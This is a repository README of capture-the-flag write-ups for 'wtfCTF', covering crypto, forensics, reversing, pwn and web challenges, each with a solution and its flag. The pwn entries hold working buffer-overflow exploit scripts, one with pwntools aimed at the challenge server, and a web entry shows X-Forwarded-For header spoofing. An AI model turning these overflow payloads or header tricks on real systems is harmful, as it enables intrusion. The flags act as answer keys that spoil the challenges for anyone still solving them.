# wtf-CTF_Writeups

<!-- TABLE OF CONTENTS -->
## Table of Contents

- [Table of Contents](#table-of-contents)
- [Crypto](#crypto)
- [Misc](#misc)
- [Reverse](#reverse)
- [Pwn](#pwn)
- [Web](#web)

## Crypto

#### wtf_Bot
###### Author: [Madjelly](github.com/madjelly)

>Join the discord server!You know how to ask bot for flag or help. Don't you?
###### Exploit
```
Bot will dm participent encrypted flag when they use the command wtf
and its vigenere cipher with key IAMGROOT
                                                        
```
###### Flag: wtfCTF{D15c0rd_B0t_m4st3r}

#### Validate
###### Author: [Pal](github.com/PalChheda)

> Use the file to validate your flag. Submit the flag in the form wtfCTF{...}

###### Exploit
```py
str = "@m1dCn4TypF"
out = "k33p"
i2 = 3
for i4 in str:
    for i5 in str:
        for i6 in str:
            for i7 in str:
                if (ord(i7)-ord(i4)!=42): continue
                for i8 in str:
                    i8=i5
                    for i9 in str:
                        if(ord(i9)%ord(i8)!=46): continue
                        if((ord(i7)+1)!=ord(i9)): continue
                        for i10 in str:
                            if((ord(i7)%ord(i6)+89)!=ord(i10)): continue
                            for i11 in str:
                                if((ord(i11)-ord(i8)+ord("3"))!=ord("c")):continue
                                for i12 in str:
                                    i12=i6
                                    for i13 in str:
                                        if(((ord(i9)%ord(i5))*2)!=(ord(i13)+40)): continue
                                        if(ord(i4)%ord(i13)!=15): continue
                                        for i14 in str:
                                            if((ord(i14)%ord(i13))!=(ord(i12)-32)): continue
                                            for i15 in str:
                                                i15=i4
                                                for i16 in str:
                                                    
                                                    if(ord(i16)%ord(i15)!=17): continue
                                                    for i17 in str :
                                                        if((ord(i14)-ord(i6))!=(ord(i17)+2)): continue
                                                    x=0
                                                    y=132
                                                    p = out+i4+i5+i6+i7+i8+i9+i10+i11+i12+i13+i14+i15+i16+i17
                                                    for i in range(4,18):
                                                        x = x^ord(p[i])
                                                        y = y+ord(p[i])
                                                        if (x!=72): continue
                                                        if(y!=1250): continue
                                                        print(p)
                                                        exit()
                                                        
```
###### Flag: wtfctf{k33pC@1m@ndp14yCTF}

#### H4CK3R Vs C0d3R [250 pts]
###### Author: [OrkinKIng](github.com/nithinchowdary007)

>Are you the hacker or a coder?    

###### Exploit
```py
from PIL import Image
import numpy as np
import os

file_names = ["flag_A.png", "flag_B.png"]
img_data = [np.asarray(Image.open(f'{name}')) for name in file_names]

data = img_data[0].copy() + img_data[1].copy()

new_image = Image.fromarray(data)
new_image.save("Fl48.png", "PNG")
                                                        
```
###### Flag: wtfCTF{Did_u_h4ck1t_or_50lv31t}

#### Pr4nK 
###### Author: [OrkinKIng](github.com/nithinchowdary007)

> Your hacker friend wants to tell you something important. But he always pulls pranks on you. Do you think this is one of them? =)   

###### Exploit
```py
# $ python3
#   >>> sage
#   sage: F = Zmod(p)
#   sage: s = log(F(x),b)


import binascii
import random
from sage import * 

p = 179769313486231590772930519078902473361797697894230657273430081157732675805500963132708477322407536021120113879871393357658789768814416622492847430639474124377767893424865485276302219601246094119453082952085005768838150682342462881473913110540827237163350510684586298239947245938479716304835356329624224137216
b= 149733475951654611435485852636503462360419431625844811241225668286284799373393229121755413581332437253515308688705712198033222168356069135381725429207716799743452621132503434661154296474671641726765228754999897360358921101851429150740942709064201973884358010092795038667869719487279605307308212147315688112751
x= 173461341675442229778539870748603655241686899663646258074060750036601965898752413973023079384002427740485457162226788195311386766376138369988471625366193107547326639644919642786662908338703301006188324040706160676236642204162838222449467093128063997396892938631156175288627180355448914848388762370224581157313

s = 3500760834200815824254912959978360560462778842148099201384671771825403517354174011533757009996439851598794283042533708449934245863525469711985409342348442867824703870828474794222597219644096639185101676609846821311426681114851095712195523998956581895736228820227678148680332925468816919947782412925162146012
y = 1431725351666854327650487831683809723565021044975862154353614601689216004865699763454109331577440307835794215097069548793757044927012062589819925443918910407289159526351343742011693068430870280305529526760079047719590253853873911780957339125193979441336118434336769492861575204568722326236813626253477
Message = 25725730038891467118328236133799556279307396598390149367568843983651868587442021547239808273956257395146827154530613429355185472589501256465137117916779600495092856746229090673641545154456435098087912224275724663935098762446345333057814501138394974538649337000091144665607928483480739418360844865162643492844 
z = pow(y, s, p)
flag = Message ^ z
from Crypto.Util.number import long_to_bytes
print(long_to_bytes(flag))
                                                        
```
###### Flag: wtfCTF{1nc0gn1t0_c4nt_st0p_v1ru5_dumb0!}

#### Elgamal
###### Author: [Madjelly](github.com/madjelly)

>ElGamal is stuck on this problem. Can you help him solve it?
>
>P = 2147483647 ; a * da = 335007430212 ; c2 = [782609095, 956334224, 948802740, 27994553, 1649557991, 1242339631, 2047940013, 1044206616, 758980367, 542738157, >1732201892, 196836220, 193577195, 649932019, 1925903078, 862766676];
>
>da is related to P in the same way that a is Public key : {P, a, b} Private key = da ; b = (a ^ da) mod P; c1 = (a^r) mod P, where r is a random integer >calculated by the following loop: 2 < r < (len(c2)+2)

###### Exploit
```
The given problem requires two things: the primitive roots of P, and c1. With some trial and error, a and da can be found out as 156 and 2147483527 respectively. Following that, c1 can be calculated to: [14400, 2145755647, 207360000, 886603764, 981730670, 303920185, 36799799, 2026475061, 1636128438, 1233082964, 206415963, 999888204, 272499752, 1659768112, 543805731, 1315305337]

r varies from 2 to 18

Finally, the flag can be decrypted using the values of c1, c2 and da. The tool can be used for decryption: https://cryptocalc.giondesign.com.au/elgamal-crypto-calc/ 
                                                        
```
###### Flag: wtfCTF{3l_g4m4l}

#### Thr34t M0del
###### Author: [Madjelly](github.com/madjelly)

>Whitfield and Martin are threat modelers who use password protected files. They use the following method of arriving at the password: P = 8191 a and b are >Merssene primes. G is related to a and b such that (a*b)-G = 14 The final key is 4278, while the password = (a+1)th term of the Geometric progression where G = >a0, b = r
>
>Flag: 7YHJGW06TRzMQnvg2rw4oa6ugAlcMRg6
>
>They are threat modelers, can you understand their work and get the flag?

###### Exploit
```
The given threat model Describes the blowfish encryption system. The first branch points towards a Feistel Cipher, which is the family of ciphers that Blowfish belongs to. The second describes known vulnerabilities and drawbacks of the blowfish cipher. The third points towards the encripted zip file containing the key.

a = 7, b = 31, G = 203 Password: 5585060664533

Decrytion Tool: http://sladex.org/blowfish.js/
                                                        
```
###### Flag: wtfCTF{thr3at_m0d3l}

## Misc

#### K3yL0gg3r
###### Author: [Pal](github.com/PalChheda)

> You can't! ;)

###### Exploit
```
The text in the image file are basically VIM commands.
Simply type the commads on the vim editor to get a base64 encrypted flag.      
```
###### wtfCTF{Vim_eDit0r_i$_4weS0mE}

#### m15tery_Box
###### Author: [AyushVatsa](github.com/mrvatsa)

>I keep losing my “keys”. Can you help me find it?    

###### Exploit
```
You start with any steghide tool (zsteg, binwalk) to extract the files from the PNG (LSBmy5t3ry80x.png). You will then have the mother folder with the hidden flag inside. The flag is in three parts and the user has to navigate through the folders and files decrypting the cryptos to get to the flag or to get Rick-rolled.
                                                     
```
###### wtfCTF{in_thr33_pAr!s}

#### R3veng3 0f th3 Inv151ble 
###### Author: [ShadowRnG](github.com/ShadowRnG)

> They've been ignored for far too long and now they're fed up. They decided that they needed to do something big to catch everyone's attention and so they >kidnapped the flag!! You're going to have to negotiate with them but don't worry, they aren't violent.......they just want to be understood.


###### Exploit
```
There are a lot of hints that point towards the answer! The extension is .ws Try It Online is a site with online interpreters for all sorts of practical and recreational programming languages. It has a compiler for whitespace as well. The line in the description that says they just want to be understood hints at the whitespaces having some extrinsic meaning to them. The hint: the only visible string in the file has words that are separated by underscores instead of spaces meaning that again the whitespaces have some unusual importance.

To get the flag simply give the file as an input to a whitespace compiler and the output is the flag.
                                                        
```
###### Flag: wtfCTF{wsp4c3s_m4tt3r!}

#### WhaTs4pP
###### Author: [Madjelly](github.com/madjelly)

>You wake up one day to your grandparent's whatsapp message which reads:
>
>Here's your flag: 8078DF5A840AD2A19DEA17654B1357400C8E4AD12573AA4D8CDD96ADD938625D


###### Exploit
```
Algorithm: AES 256 Key: covidsayshellowearamask&staysafe Tool used for encryption: Steghide, with the password "E2E" Stegcracker can be used to brute force the key, but will be impossible to do so without "E2E" in the wordlist.

Hints: For 50 points: Whatsapp uses E2E encryption.

Once the key is retreived, they may use the following tool to decrypt the flag: https://www.devglan.com/online-tools/aes-encryption-decryption.                                                 
```
###### Flag: wtfCTF{C0v1d_b4d}

#### W1n_W0n
###### Author: [OrkinKing](github.com/nithinchowdary007)

>My friend hid something on my system. I want to know what it is, But Im bad at analysing. Can you do it for me?

###### Exploit
```
Check imageinfo using volatility
Check pslist, we observer cmd and winrar
check cmdscan(volatility 2), we find a string not sure where to use[password for zip file]
as winrar is running, check file scan with grepping rar or zip, we get 1mP.zip encrypted with pwd
use the string we got in cmdscan as pwd and we get the flag
                                                        
```
###### Flag: wtfCTF{W1nd0w5_1s_f0r_N0085}

#### W1n_W0n_Pr0
###### Author: [OrkinKing](github.com/nithinchowdary007)

>Hey! One of my friends borrowed my computer yesterday and I don't know what he did with it. I have obtained a dump of my computer. I know you are an analyst and >want you to find out some information for me.
>
>How many times is calc.exe exeuted?
>How long is mspaint.exe being used?
>There was a USB device connected to PC. When was it last connected?
>FLAG FORMAT: wtfCTF{count_MM:SS_YYYY-MM-DD_HH:MM:SS}
###### Exploit
```
python2 vol.py -f /home/orkinking/Documents/Incognito/wtfCTF/W1n_W0n_pr0/Challenge2.raw --profile=Win7SP1x64 userassist
python2 vol.py --plugins=volatility_plugins/usbstor -f /home/orkinking/Documents/Incognito/wtfCTF/W1n_W0n_pr0/Challenge2.raw --profile=Win7SP1x64 usbstor
                                                        
```
###### Flag: wtfCTF{45_08:17_2021-05-21_08:00:17}

#### ArchTic
###### Author: [OrkinKing](github.com/nithinchowdary007)

> Can you help Nemo find the flag? Nemo loves a challenge—and a flag. ArchTic
###### Exploit
```
The docker image runs Arch linux within it, so all basic unix commands work.

The image can be started with the following command: docker run -d --tty --name -p 

The command docker exec -it  bash will open up an interactive terminal that you can use to access the contents of the container.

The flag is hidden in the file .flag.txt, which in turn is within: ./usr/lib/python3.9/site-packages/libmount/cache/data/text/12.12.2021/strings/challenge_dir/.flag.txt find ./usr -name .flag.txt can be used to locate the file


```
###### Flag: wtfCTF{4rch_1s_fun}

#### Lov3
###### Author: [OrkinKing](github.com/nithinchowdary007)

>Unfortunately my assistant deleted some of the files from my flash drive. Can you retrieve them and collect the flag?

###### Exploit
```
Open FTK imager and analyse the given USB image.
retreive the files(some images,audios, text files). EXport the files.
Correct the currupted chuck data of retrieved files and find the correct flag from all those file.
```
###### wtfCTF{y0U_Ar3_g00d_47_Da7A_r3c0v3rY}

## Reverse

#### H3ll0R3v
###### Author: [Xyroscar](github.com/Xyroscar)

>Hello bois!

###### Exploit
```
Only the python compiled code will be given to the participants.

The participants will have to use a tool like uncompyle6, decompile3 etc to decompile the code.

As of now, none of the tools support python 3.9 so i have compiled the code using 3.8.9. If participants have python 3.9 they will have to create a virtual environment in which they install an older version of python to use the decompilers.


```
###### Flag: wtfCTF{3Z_R3VER53}

#### a2z's playground
###### Author: [ShadowRnG](github.com/ShadowRnG)

>a2z is a happy little kid in a program. He's like any other kid and he likes playing games, candy, comic books, frequency, puppies, balloons and ice cream like >any other normal kid. He also likes a particular string "ihavealotoffunplayingwithu". See if you can win his favour and get the flag.

###### Exploit
```
The challenge is intended to be solved using dynamic analysis.
The program is split into 2 "games" and technically 3 parts.

The 2 games are simple enough.
In the first game, a2z asks for an input of lowercase alplhabets and expects the same.
In the second game, a2z expects an input of 26 integers.
All of this can be derived from the execution of the program.

The 3 parts that it is split into can be uncovered by viewing the decompilation through a tool of your choice.
There are 3 main functions: Frequency, Num2alph and flagify.
The name also hints at what the program could be doing, from character(a) to integer(2) and back to character(z).

The first 2 parts are what comprise the first game and goes as follows:
a2z takes your input of lowercase alphabets and serves it as an input to Frequency which gives an output of an array with 26 integers.
Each of these 26 integers is the frequency of the corresponding alphabet (1st int is freq of a and 26th is that of z).
The output of Frequency is then given as input to Num2alp which takes integer and converts it to the corresponding location in the alphabet(1 is 'a' and 26 is 'z')
Note: The size of the output array is easy to determine as a simple '\n' will give you 26 blanks(_) and furthermore the size should hint at what could be going on in the functions.
Experimenting with the program should confirm any theories.
To get the required answer, find the input required for a2z to give "ihavealotoffunplayingwithu" as the output.

The second game is very easy once the first game is understood, simply give the array of 26 integers used to get the correct output in the first game.
Once the correct array is provided, flagify will output the flag.
```
###### Flag: wtfCTF{s4d_t0_s33_u_g0_:(}

## Pwn

#### MoM5m4g1c
###### Author: [OrkinKing](github.com/nithinchowdary)

>Son:I want my chocolate mom! Mother: Fill the water bottle son! :)
>
>nc 20.42.99.115 3000

###### Exploit
```py
(python -c 'print("a"*144)')| ./prison
```
###### Flag: wtfCTF{N1c3!n0w_U_c4N_34t_uR_Ch0c0L4t3}

#### k3Y
###### Author: [OrkinKing](github.com/nithinchowdary)

> Do you have the key to escape from this room?
>
> nc 20.42.99.115 3143
###### Exploit
```
This challenge focuses on pseudo-random number generators, the randomness of the generated numbers depends on the seed, different seeds result in different sequence of numbers each time.

The bug in this code is that it uses the default seed each time, which is 1. This will generate the same sequence every time and we can predict the first number in the sequence.

If we compile this code and add printf("%d", random), we get the value 1804289383. This value XORed with 0xacedface will get us the Key  
```
###### Flag: wtfCTF{c0n80!_Th15_i5_tH3_fL48}

#### Pr1ns0n_Br34k
###### Author: [OrkinKing](github.com/nithinchowdary)

> Really? Do u really want to break the prison you built on your own? You are insane!
>
>nc 20.42.99.115 3213
###### Exploit
```py
from pwn import *

from ptrlib import *
elf = ELF("./prison")
#sock = Process(["stdbuf", "-o0", "./aquarium"])
sock = Socket("20.42.99.115", 3213)
payload = b"A" * 168
payload += p64(elf.symbol("flag"))
# Stage 1
sock.sendline("1")
sock.sendline("2")
sock.sendline("3")
sock.sendline("4")
sock.sendline("5")
sock.recvuntil("Where is this prison: ")
sock.sendline(payload)
sock.interactive() 
```
###### Flag: wtfCTF{Pr150n3rs_35c4p3d_b3f0r3_3v3n_3nt3r1n8}

## Web

#### M4sk3r
###### Author: [hackerb0ne](github.com/Hackerb0ne)

>Can you Mask it?  https://masker.herokuapp.com/

###### Exploit
```
Basically Heroku manipulates the X-Forwarded-For header so it's tricky to assess the header IP list for the client's IP because we don't have clarity which IP is added from the start and which one from the back. The challenge is to get the first IP, the 3rd IP and the last IP in the list of IP's in the list of IP's to be the same. Now, this is a tricky task unless you know that passing another X-Forwarded-For header request will append the IP's passed in the second header to the IP list.

Now for getting the flag:

   1) We know from the source code, we have to intercept the request made to /getFlag endpoint
   2) Once we intercepted the request, We need to pass this payload in the request header:

    X-Forwarded-For: 6.9.6.9, X.X.X.X , 6.9.6.9
    X-Forwarded-For: 6.9.6.9

If you did it right, you should get :

Damn, nice one you get to enjoy this : wtfCTF{just_4n0th3r_h34d3r}

```
###### Flag: wtfCTF{just_4n0th3r_h34d3r}

#### T3a_T1me
###### Author: [TheProton](github.com/Parthiv-M)

>Can you help John?  https://timeisthekey.herokuapp.com/


###### Exploit
```
This challenge requires the knowledge of cookies, which are sent from the server to the client side and stored on the browser. The player needs to find out the correct guess to the problem statement: 'John lives in the UK and loves cream bisucits the most. Can you guess what he does not like?'.

On completing the first guess with rolled, the client recieves a cookie with a link. The second answer being drop, as hinted by the cookie, the client receives a third cookie which points to the next answer. On entering the third answer scones correctly, the client is presented with a final cookie named key and a text on the screen saying 'John absolutely hates scones! Let them rot!' along with an encrypted flag.

The flag is a rot cipher with the number of rotations correspoinding to the number of milliseconds of time at the instance when the user submits the final guess. The key is available from the cookie.
```
###### Flag:  wtfCTF{th15_1s_4_c00k13_g4m3}





